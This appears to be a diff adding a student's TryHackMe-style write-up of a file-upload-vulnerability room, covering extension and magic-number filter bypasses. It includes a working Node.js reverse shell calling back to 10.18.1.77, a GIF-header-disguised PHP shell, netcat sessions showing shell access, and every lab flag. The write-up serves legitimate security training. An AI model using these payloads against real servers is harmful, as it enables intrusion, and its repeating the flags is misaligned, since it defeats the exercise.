@@ -251,3 +251,257 @@ $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
 switch($extension){
 case "php":
 case "phtml":
+case NULL:
+$uploadFail = True;
+break;
+default:
+$uploadFail = False;
+}
+?>
+In this instance, the code is looking for the last period (.) in the file name and uses that to confirm the extension, so that is what we'll be trying to bypass here. Other ways the code could be working include: searching for the first period in the file name, or splitting the file name at each period and checking to see if any blacklisted extensions show up. We'll cover this latter case later on, but in the meantime, let's focus on the code we've got here.
+We can see that the code is filtering out the .php and .phtml extensions, so if we want to upload a PHP script we're going to have to find another extension. The wikipedia page for PHP gives us a few common extensions that we can try; however, there are actually a variety of other more rarely used extensions available that webservers may nonetheless still recognise. These include: .php3, .php4, .php5, .php7, .phps, .php-s, .pht and .phar. Many of these bypass the filter (which only blocks.php and .phtml), but it appears that the server is configured not to recognise them as PHP files, as in the below example:
+![](https://i.imgur.com/yzOGVob.png)
+This is actually the default for Apache2 servers, at the time of writing; however, the sysadmin may have changed the default configuration (or the server may be out of date), so it's well worth trying.
+Eventually we find that the .phar extension bypasses the filter -- and works -- thus giving us our shell:
+![](https://i.imgur.com/Aigaz4R.png)
+Let's have a look at another example, with a different filter. This time we'll do it completely black-box: i.e. without the source code.
+Once again, we have our upload form:
+![](https://i.imgur.com/STsI51E.png)
+Ok, we'll start by scoping this out with a completely legitimate upload. Let's try uploading the spaniel.jpg image from before:
+![](https://i.imgur.com/tp6T2WH.png)
+Well, that tells us that JPEGS are accepted at least. Let's go for one that we can be pretty sure will be rejected (shell.php):
+![](https://i.imgur.com/hk4inJ2.png)
+Can't say that was unexpected.
+From here we enumerate further, trying the techniques from above and just generally trying to get an idea of what the filter will accept or reject.
+In this case we find that there are no shell extensions that both execute, and are not filtered, so it's back to the drawing board.
+In the previous example we saw that the code was using the pathinfo() PHP function to get the last few characters after the ., but what happens if it filters the input slightly differently?
+Let's try uploading a file called shell.jpg.php. We already know that JPEG files are accepted, so what if the filter is just checking to see if the .jpg file extension is somewhere within the input?
+Pseudocode for this kind of filter may look something like this:
+ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput
+IF STRING ".jpg" IS IN VARIABLE userInput:
+SAVE THE FILE
+ELSE:
+RETURN ERROR MESSAGE
+When we try to upload our file we get a success message. Navigating to the /uploads directory confirms that the payload was successfully uploaded:
+![](https://i.imgur.com/K55eu9o.png)
+Activating it, we receive our shell:
+![](https://i.imgur.com/VVAKZfw.png)
+This is by no means an exhaustive list of upload vulnerabilities related to file extensions. As with everything in hacking, we are looking to exploit flaws in code that others have written; this code may very well be uniquely written for the task at hand. This is the really important point to take away from this task: there are a million different ways to implement the same feature when it comes to programming -- your exploitation must be tailored to the filter at hand. The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.
+Now your turn. You know the drill by now -- figure out and bypass the filter to upload and activate a shell. Your flag is in /var/www/. The site you're accessing is annex.uploadvulns.thm.
+Be aware that this task has also implemented a randomised naming scheme for the first time. For now you shouldn't have any trouble finding your shell, but be aware that directories will not always be indexable...
+*first press select then choose shell.php5, then netcat and go to /privacy found with feroxbuster*
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.18.1.77] from (UNKNOWN) [10.10.102.33] 45994
+Linux a2b9a5609bd8 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 16:42:55 up  2:23,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+cat /var/www/flag.txt
+THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}
+```
+### Bypassing Server-Side Filtering: Magic Numbers
+We've already had a look at server-side extension filtering, but let's also take the opportunity to see how magic number checking could be implemented as a server-side filter.
+As mentioned previously, magic numbers are used as a more accurate identifier of files. The magic number of a file is a string of hex digits, and is always the very first thing in a file. Knowing this, it's possible to use magic numbers to validate file uploads, simply by reading those first few bytes and comparing them against either a whitelist or a blacklist. Bear in mind that this technique can be very effective against a PHP based webserver; however, it can sometimes fail against other types of webserver (hint hint).
+Let's take a look at an example. As per usual, we have an upload page:
+![](https://i.imgur.com/yQnQGsn.png)
+As expected, if we upload our standard shell.php file, we get an error; however, if we upload a JPEG, the website is fine with it. All running as per expected so far.
+From the previous attempt at an upload, we know that JPEG files are accepted, so let's try adding the JPEG magic number to the top of our shell.php file. A quick look at the list of file signatures on Wikipedia shows us that there are several possible magic numbers of JPEG files. It shouldn't matter which we use here, so let's just pick one (FF D8 FF DB). We could add the ASCII representation of these digits (ÿØÿÛ) directly to the top of the file but it's often easier to work directly with the hexadecimal representation, so let's cover that method.
+Before we get started, let's use the Linux file command to check the file type of our shell:
+As expected, the command tells us that the filetype is PHP. Keep this in mind as we proceed with the explanation.
+We can see that the magic number we've chosen is four bytes long, so let's open up the reverse shell script and add four random characters on the first line. These characters do not matter, so for this example we'll just use four "A"s:
+![](https://i.imgur.com/oe434wu.png)
+Save the file and exit. Next we're going to reopen the file in hexeditor (which comes by default on Kali), or any other tool which allows you to see and edit the shell as hex. In hexeditor the file looks like this:
+![](https://i.imgur.com/otIyN96.png)
+Note the four bytes in the red box: they are all 41, which is the hex code for a capital "A" -- exactly what we added at the top of the file previously.
+Change this to the magic number we found earlier for JPEG files: FF D8 FF DB
+![](https://i.imgur.com/2OlGKdQ.png)
+Now if we save and exit the file (Ctrl + x), we can use file once again, and see that we have successfully spoofed the filetype of our shell:
+![](https://i.imgur.com/ldyt88v.png)
+Perfect. Now let's try uploading the modified shell and see if it bypasses the filter!
+![](https://i.imgur.com/Coat5LI.png)
+There we have it -- we bypassed the server-side magic number filter and received a reverse shell.
+Head to magic.uploadvulns.thm -- it's time for the last mini-challenge.
+This will be the final example website you have to hack before the challenge in task eleven; as such, we are once again stepping up the level of basic security. The website in the last task implemented an altered naming scheme, prepending the date and time of upload to the file name. This task will not do so to keep it relatively easy; however, directory indexing has been turned off, so you will not be able to navigate to the directory containing the uploads. Instead you will need to access the shell directly using its URI.
+Bypass the magic number filter to upload a shell. Find the location of the uploaded shell and activate it. Your flag is in /var/www/.
+https://en.wikipedia.org/wiki/List_of_file_signatures
+*first add 4 letters and change with hexeditor to FFD8FFDB and get png file*
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ ls
+cmd.php  magic.php  revshell.php  revshell.png
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ file magic.php   
+magic.php: PHP script, ASCII text
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ nano magic.php
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ file magic.php
+magic.php: ASCII text
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ nano magic.php
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ hexeditor magic.php
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ file magic.php
+magic.php: JPEG image data
+```
+```text
+hexeditor magic.php
+```
+*now upload and use netcat* *so dont accept png instead GIFs only please!*
+47 49 46 38 37 61 GIF87a
+47 49 46 38 39 61 	GIF89a
+0 	gif 	Image file encoded in the Graphics Interchange Format
+*found with ferxbuster http://magic.uploadvulns.thm/graphics/magic.php (graphics)*
+*so just add*
+```magic.php
+GIF87a
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+```
+```text
+──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ file magic.php
+magic.php: GIF image data, version 87a, 15370 x 28735
+```
+*now upload*
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.18.1.77] from (UNKNOWN) [10.10.102.33] 59304
+Linux 94d79a333b8d 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 17:09:23 up  2:49,  0 users,  load average: 0.00, 0.14, 0.13
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+cat /var/www/flag.txt
+THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}
+$
+```
+### Example Methodology
+We've seen various different types of filter now -- both client side and server side -- as well as the general methodology for file upload attacks. In the next task you're going to be given a black-box file upload challenge to complete, so let's take the opportunity to discuss an example methodology for approaching this kind of challenge in a little more depth. You may develop your own alternative to this method, however, if you're new to this kind of attack, you may find the following information useful.
+We'll look at this as a step-by-step process. Let's say that we've been given a website to perform a security audit on.
+The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as server or x-powered-by can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.
+Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.
+We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on.
+An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
+Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.
+Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:
+If you can successfully upload a file with a totally invalid file extension (e.g. testingimage.invalidfileextension) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
+Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
+As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.
+Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.
+You should now be well equipped to take on the challenge in task eleven.
+Read the example methodology *No answer needed*
+### Challenge
+It's challenge time!
+Head over to jewel.uploadvulns.thm.
+Take what you've learned in this room and use it to get a shell on this machine. As per usual, your flag is in /var/www/. Bear in mind that this challenge will be an accumulation of everything you've learnt so far, so there may be multiple filters to bypass. The attached wordlist might help. Also remember that not all webservers have a PHP backend...
+If you need a help, there are a series of hints here.
+Additionally, there is a full video walkthrough available for this challenge here.
+*first use gobuster and found admin,content then check source code and every image is save on HER.png*
+```tee to save
+gobuster dir --url http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -t 60 -x jpg | tee gobuster-content-default
+
+found before uploading your shell.js
+/ABH.jpg              (Status: 200) [Size: 705442]
+/AXD.jpg              (Status: 200) [Size: 380]   
+/LKQ.jpg              (Status: 200) [Size: 444808]
+/SAD.jpg              (Status: 200) [Size: 247159]
+/UAD.jpg              (Status: 200) [Size: 342033]
+```
+*to MIME let upload the shell.js use burpsuite and use CTRL + f5 at the time of use foxyproxy(burp) forward,forwad, when see upload.js do intercept response to the request then forward and erase the 3 functions of script which are commented, now I can upload the shell which is*
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ nano shell.js
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ cat shell.js             
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(443, "10.18.1.77", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ ls
+cmd.php                   magic.php     revshell.png  UploadVulnsWordlist.txt
+gobuster-content-default  revshell.php  shell.js
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ mv shell.js shell.jpg
+```
+*now see what is ur shell.jpg name*
+```text
+gobuster dir --url http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -t 60 -x jpg | tee gobuster-content-default
+
+found after uploading your shell.js
+/ABH.jpg              (Status: 200) [Size: 705442]
+/EVE.jpg              (Status: 200) [Size: 380]   
+/LKQ.jpg              (Status: 200) [Size: 444808]
+/SAD.jpg              (Status: 200) [Size: 247159]
+/UAD.jpg              (Status: 200) [Size: 342033]
+
+so is EVE because change also u can test going to http://jewel.uploadvulns.thm/content/EVE.jpg (and won't show like a img while the others yep)
+```
+*final go to http://jewel.uploadvulns.thm/admin  and write ../content/EVE.jpg and the arrow, obviously doing a listener netcat*
+```found
+┌──(kali㉿kali)-[~/Downloads/learning_uploadvuln]
+└─$ sudo nc -lvnp 443            
+[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [10.18.1.77] from (UNKNOWN) [10.10.102.33] 38148
+whoami
+root
+cat /var/www/flag.txt
+THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}
+:)
+```
+### Conclusion
+Well, that's us done. Hopefully you've learnt something from completing this room. This was a very brief introduction to the basics of file upload vulnerabilities -- there is a lot more to learn! Use what you've learnt here to go and research more advanced exploits related to malicious file uploads.
+Now that you've finished the room, remember to revert the changes you made your hosts file, way back in Task 1.
+As a reminder, here are the commands to do so.
+On Linux or MacOS:
+sudo sed -i '$d' /etc/hosts
+On Windows:
+(GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts
+Room completed, and hosts file reverted! *No answer needed*
+
+## Flags / Answers
+- Overwrite the image. What is the flag you receive? ***THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}** *
+- What's the flag in the /var/www/ directory of the server? ***THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}***
+- What is the flag in /var/www/? ***THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}***
+- What is the flag in /var/www/? ***THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}***
+- Grab the flag from /var/www/ ***THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}***
+- Hack the machine and grab the flag from /var/www/ ***THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}***
+
+## Notes / Lessons Learned
+[[Burp Suite Other Modules]]
+
